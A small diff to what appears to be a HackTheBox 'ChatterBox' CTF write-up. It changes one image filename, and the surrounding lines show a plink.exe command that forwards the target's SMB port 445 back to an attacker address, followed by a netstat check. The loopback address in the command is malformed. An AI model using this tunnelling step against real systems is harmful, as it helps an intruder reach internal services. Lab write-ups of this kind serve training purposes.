@@ -163,7 +163,7 @@ Now we can run the port forwarding on the target machine with:
 `plink.exe -l root -pw <pass> -R 445:127.0.0.0.1:445 10.10.14.68 -P 2222`
 
 
-![plink-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/plink-15.png)
+![plink-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/plinkk-15.png)
 
 
 On our Kali machine we can check the status of port 445 with `netstat -ao | grep 445`:
